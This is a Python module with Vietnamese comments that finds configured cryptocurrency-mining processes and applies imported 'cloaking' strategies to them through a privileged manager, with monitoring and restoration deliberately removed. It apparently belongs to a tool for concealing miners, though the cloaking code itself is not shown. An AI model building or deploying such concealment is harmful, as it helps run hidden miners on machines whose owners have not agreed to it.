"""
Module resource_manager.py - Quản lý tài nguyên (CPU, GPU, Network...) theo mô hình đồng bộ (threading).
Sau khi refactor, module này:
- BỎ toàn bộ cơ chế giám sát (nhiệt độ, công suất) & watchers.
- BỎ cơ chế restore hoàn toàn.
- Khi start, tự động khám phá tiến trình và CLOAK luôn.
- Chỉ hỗ trợ cloaking, không có restoration.
"""

import logging
import psutil
import pynvml
import traceback
import threading
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from itertools import count

# Các import liên quan đến dự án
from .utils import MiningProcess
from .cloak_strategies import CloakStrategyFactory
from .resource_control import ResourceControlFactory, CPUResourceManager
from .auxiliary_modules.interfaces import IResourceManager
from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .privileged_operations import get_privileged_manager

class SharedResourceManager:
    """
    Lớp quản lý tài nguyên chung (VD: GPU, CPU).
    - Khởi tạo/tắt NVML
    - Đọc GPU usage, cache usage
    - Áp dụng CloakStrategy cho tiến trình
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = logger
        self.config = config
        self.resource_managers = resource_managers
        self.strategy_cache = {}
        
        # Khởi tạo PrivilegedOperationManager (singleton)
        self.privileged_manager = get_privileged_manager(logger)
        
        # Kiểm tra security context
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        self._nvml_init = False
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager khởi tạo OK.")
        except Exception as e:
            self.logger.error(f"Lỗi init SharedResourceManager: {e}\n{traceback.format_exc()}")
            raise

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self):
        if not self._nvml_init:
            pynvml.nvmlInit()
            self._nvml_init = True
            self.logger.info("NVML đã được khởi tạo thành công.")

    def shutdown_nvml(self):
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.debug("Đã shutdown NVML thành công.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi khi shutdown NVML: {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """
        Đọc /proc/[pid]/status => VmCache => tính % so với total RAM.
        """
        try:
            status_file = f"/proc/{pid}/status"
            with open(status_file, 'r') as f:
                for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        try:
            return self._sync_get_gpu_usage_percent(pid)
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        try:
            if not self.is_nvml_initialized():
                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
                self.initialize_nvml()

            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu

            return total_gpu_usage if gpu_present else 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng chiến lược cloak cho một tiến trình cụ thể.
        """
        try:
            pid = process.pid
            name = process.name
            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )
            if not strategy or not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
                return

            # Inject privileged_manager nếu strategy cần
            if hasattr(strategy, 'set_privileged_manager'):
                strategy.set_privileged_manager(self.privileged_manager)

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

            # ---------------- Sprint-2: Đăng ký PID CPU cho plug-in engine ----------------
            try:
                is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
                if not is_gpu:
                    cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
                    cpu_mgr.register_pid(pid)
            except Exception as exc:  # noqa: BLE001
                self.logger.debug(f"Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

class ResourceManager(IResourceManager):
    """
    Lớp ResourceManager chỉ còn chức năng:
    - Khởi tạo SharedResourceManager
    - Khám phá tiến trình (duy nhất 1 lần) và Cloak tất cả
    - Không giám sát, không restore
    """

    _instance = None
    _instance_lock = threading.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        self.logger = logger
        self.config = config
        self.event_bus = event_bus

        # Cờ dừng
        self._stop_flag = False

        # Danh sách process + lock
        self.mining_processes_lock = threading.RLock()
        self.mining_processes: List[MiningProcess] = []

        # Hàng đợi cloaking riêng biệt cho CPU và GPU (theo blueprint)
        self._cpu_cloaking_queue = queue.PriorityQueue()
        self._gpu_cloaking_queue = queue.PriorityQueue()
        
        # Hàng đợi cloaking chung (legacy compatibility)
        self.resource_adjustment_queue = queue.PriorityQueue()

        # Thread workers
        self.workers: List[threading.Thread] = []

        self.shared_resource_manager: Optional[SharedResourceManager] = None

        self._counter = count()
        self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"

        self.logger.info("ResourceManager.__init__ (redesigned với CPU/GPU cloaking queues)")

        # Đăng ký event 'resource_adjustment' (nếu cần)
        self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU (NVML) đã được khởi tạo hay chưa.
        """
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()

    def handle_resource_adjustment(self, event_data: Dict[str, Any]):
        """
        Handler cho event 'resource_adjustment'.
        """
        self.logger.debug(f"Nhận event resource_adjustment: {event_data}")

    def enqueue_cloaking(self, process: MiningProcess) -> None:
        """
        Đưa tiến trình vào hàng đợi cloaking phù hợp.
        Redesigned theo blueprint: CPU/GPU queues riêng biệt.
        """
        pid = process.pid
        name = process.name
        
        try:
            if self.process_states.get(pid) == "cloaked":
                self.logger.debug(f"PID={pid} đã được cloaked, bỏ qua.")
                return

            priority = process.priority
            count_val = next(self._counter)
            
            # Phân loại tiến trình theo blueprint
            is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
            
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': ['gpu_cloaking'] if is_gpu else ['cpu_cloaking']
            }
            
            # Thêm vào hàng đợi thích hợp theo blueprint
            if is_gpu:
                self.logger.info(f"Đưa {name} (PID={pid}) vào GPU cloaking queue")
                self._gpu_cloaking_queue.put((priority, count_val, task))
            else:
                self.logger.info(f"Đưa {name} (PID={pid}) vào CPU cloaking queue")
                self._cpu_cloaking_queue.put((priority, count_val, task))
                
            # Thêm vào queue chung cho legacy compatibility
            self.resource_adjustment_queue.put((priority, count_val, task))
            self.process_states[pid] = "cloaking"
            
            # Gửi event thông báo có process mới (theo blueprint)
            self.event_bus.publish('new_process_detected', {
                'pid': pid,
                'name': name,
                'is_gpu': is_gpu,
                'timestamp': time.time()
            })
            
            self.logger.info(f"✅ Đã enqueue cloaking cho {name} (PID={pid}) - {'GPU' if is_gpu else 'CPU'} queue")
            
        except Exception as e:
            self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")

    # -----------------------------------------------------------------------------------------
    # METRICS (SYNC)
    # -----------------------------------------------------------------------------------------

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"PID={process.pid} không tồn tại.")
                return {}

            proc_obj = psutil.Process(process.pid)
            cpu_pct = proc_obj.cpu_percent(interval=1)
            mem_mb = proc_obj.memory_info().rss / (1024**2)

            gpu_pct = 0.0
            if self.is_gpu_initialized():
                gpu_pct = self.shared_resource_manager.get_gpu_usage_percent(process.pid)

            # Tùy logic dự án, ở đây ví dụ:
            disk_mbps = 0.0 # Tính sau
            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) if self.shared_resource_manager else 0.0

            metrics = {
                'cpu_usage': float(cpu_pct),
                'memory_usage': float(mem_mb),
                'gpu_usage': float(gpu_pct),
                'network_usage': float(disk_mbps),
                'cache_usage': float(cache_l),
            }
            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
            return {}

    def collect_all_metrics(self) -> Dict[str, Dict[str, Any]]:
        metrics_data: Dict[str, Dict[str, Any]] = {}
        if not self.mining_processes_lock.acquire(timeout=5):
            self.logger.error("Timeout lock collect_all_metrics.")
            return metrics_data
        try:
            for p in self.mining_processes:
                res = self.collect_metrics(p)
                if res:
                    metrics_data[str(p.pid)] = res
                else:
                    self.logger.warning(f"Không có metrics hợp lệ cho PID={p.pid}")
            self.logger.debug(f"Dữ liệu metrics (all): {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        finally:
            self.mining_processes_lock.release()

        return metrics_data

    def start(self):
        self.logger.info("Bắt đầu khởi động ResourceManager (Chỉ cloaking, không restore)...")
        try:
            # Tạo resource managers
            resource_managers = ResourceControlFactory.create_resource_managers(
                config=self.config,
                logger=self.logger
            )
            if not resource_managers:
                raise RuntimeError("ResourceControlFactory trả về rỗng hoặc None.")

            # Tạo SharedResourceManager
            self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)

            # Khám phá tiến trình một lần
            self.discover_mining_processes()

            # Cloak tất cả ngay
            self._trigger_initial_cloak_signal()

            # Tạo thread xử lý queue cloaking
            adjust_thread = threading.Thread(
                target=self.process_resource_adjustments,
                daemon=True,
                name="CloakingWorker"
            )
            adjust_thread.start()
            self.workers.append(adjust_thread)

            # Vòng lặp chính "giữ" chương trình, không làm gì thêm
            self.logger.info("ResourceManager đã khởi động. Vào vòng lặp chính...")
            while not self._stop_flag:
                time.sleep(5)

            self.logger.info("ResourceManager kết thúc vòng lặp chính.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi động ResourceManager: {e}\n{traceback.format_exc()}")
            self.shutdown()

    def _trigger_initial_cloak_signal(self):
        """
        Cloak tất cả các tiến trình "đào" ngay khi phát hiện (chỉ gọi 1 lần, không lặp).
        """
        try:
            self.logger.info("Bắt đầu enqueue cloaking cho tất cả tiến trình khai thác...")
            if not self.mining_processes_lock.acquire(timeout=5):
                self.logger.warning("Không lock được mining_processes, bỏ qua cloak.")
                return

            for process in self.mining_processes:
                try:
                    self.enqueue_cloaking(process)
                except Exception as e:
                    self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

            self.logger.info("Hoàn thành enqueue cloaking ban đầu.")
        except Exception as e:
            self.logger.error(f"Lỗi khi enqueue cloaking ban đầu: {e}\n{traceback.format_exc()}")
        finally:
            try:
                self.mining_processes_lock.release()
            except RuntimeError:
                pass

    def process_resource_adjustments(self):
        """
        Worker loop chạy trong một thread riêng để xử lý queue resource_adjustment.
        Chỉ có tác vụ 'cloaking' -> chuyển trạng thái process thành 'cloaked'.
        """
        self.logger.info("=== Bắt đầu vòng lặp process_resource_adjustments (CloakingWorker)...")
        pid = None

        while not self._stop_flag:
            try:
                item = self.resource_adjustment_queue.get(timeout=1)
                priority, count_val, task = item

                p = task.get('process')
                if not p:
                    raise ValueError("Task không có 'process'.")

                pid = p.pid
                self.logger.info(
                    f"[CloakingWorker] Lấy task type={task['type']} cho PID={pid} (priority={priority})."
                )

                if task['type'] == 'cloaking':
                    # Cloaking
                    if not self.shared_resource_manager:
                        self.logger.warning("Chưa có shared_resource_manager, bỏ qua cloaking.")
                        self.resource_adjustment_queue.task_done()
                        continue

                    sr = self.shared_resource_manager
                    strategies = task.get('strategies', [])
                    self.logger.info(f"[CloakingWorker] Bắt đầu cloaking PID={pid} với {strategies}...")

                    for strat in strategies:
                        if strat not in sr.strategy_cache:
                            s = CloakStrategyFactory.create_strategy(
                                strat, self.config, self.logger, sr.resource_managers
                            )
                            sr.strategy_cache[strat] = s
                        else:
                            s = sr.strategy_cache[strat]

                        if s and hasattr(s, 'apply'):
                            s.apply(p)

                    self.process_states[pid] = "cloaked"
                    self.logger.info(f"Process PID={pid} chuyển trạng thái -> cloaked.")

                    # ---------------- Sprint-2: Đăng ký PID CPU cho plug-in engine ----------------
                    try:
                        is_gpu = hasattr(p, "is_gpu_process") and callable(getattr(p, "is_gpu_process")) and p.is_gpu_process()
                        if not is_gpu:
                            cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
                            cpu_mgr.register_pid(pid)
                    except Exception as exc:  # noqa: BLE001
                        self.logger.debug(f"Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")

                self.resource_adjustment_queue.task_done()
                self.logger.info(
                    f"[CloakingWorker] Đã task_done() cho PID={pid}, type={task['type']}."
                )

            except queue.Empty:
                # Không có task => tiếp tục vòng lặp
                continue
            except Exception as e:
                self.logger.error(f"Lỗi process_resource_adjustments: {e}. (PID={pid})")

        self.logger.info("=== Thoát vòng lặp process_resource_adjustments (stop_flag=True).")

    def discover_mining_processes(self):
        """
        Khám phá các tiến trình "đào" (dựa vào config.processes: 'CPU', 'GPU' ...),
        và thêm vào self.mining_processes. Gọi 1 lần khi start().
        """
        try:
            if not self.mining_processes_lock.acquire(timeout=5):
                self.logger.error("Timeout khi acquire lock discover_mining_processes.")
                return

            self.mining_processes.clear()

            cpu_name = self.config.processes.get('CPU', '').lower()
            gpu_name = self.config.processes.get('GPU', '').lower()

            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    pname = proc.info['name'].lower()
                    if cpu_name in pname or gpu_name in pname:
                        prio = self.get_process_priority(proc.info['name'])
                        net_if = self.config.network_interface
                        mproc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
                        self.mining_processes.append(mproc)

                        if mproc.pid not in self.process_states:
                            self.process_states[mproc.pid] = "normal"

                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")
        finally:
            try:
                self.mining_processes_lock.release()
            except RuntimeError:
                pass

    def get_process_priority(self, process_name: str) -> int:
        priority_map = self.config.process_priority_map
        pri_val = priority_map.get(process_name.lower(), 1)
        if not isinstance(pri_val, int):
            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán=1.")
            return 1
        return pri_val

    def shutdown(self):
        self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")

        # Bước 0: Chờ hàng đợi cloaking xử lý xong
        self.logger.info("Đợi xử lý xong các tác vụ trong resource_adjustment_queue.")
        self.resource_adjustment_queue.join()
        self.logger.info("Tất cả tác vụ resource_adjustment đã xử lý xong.")

        # Bước 1: Đặt cờ dừng
        self._stop_flag = True

        # Bước 2: Chờ thread "CloakingWorker" dừng
        start_time = time.time()
        timeout = 10
        self.logger.info(f"Chờ tối đa {timeout} giây để dừng CloakingWorker...")

        while time.time() - start_time < timeout:
            if all(not w.is_alive() for w in self.workers):
                self.logger.info("CloakingWorker đã dừng.")
                break
            time.sleep(2)
        else:
            self.logger.warning("CloakingWorker vẫn đang chạy sau thời gian chờ.")

        # Bước 3. Tắt NVML
        try:
            if self.shared_resource_manager:
                self.shared_resource_manager.shutdown_nvml()
                self.logger.info("NVML đã được tắt.")
            else:
                self.logger.warning("Không có shared_resource_manager, bỏ qua tắt NVML.")
        except Exception as e:
            self.logger.error(f"Lỗi khi tắt NVML: {e}")

        # Bước 4. join workers
        for w in self.workers:
            try:
                w.join(timeout=2)
                if w.is_alive():
                    self.logger.warning(f"Thread {w.name} chưa dừng hẳn.")
            except Exception as e:
                self.logger.error(f"Lỗi khi join thread {w.name}: {e}")

        self.logger.info("Dừng ResourceManager... (HOÀN THÀNH)")
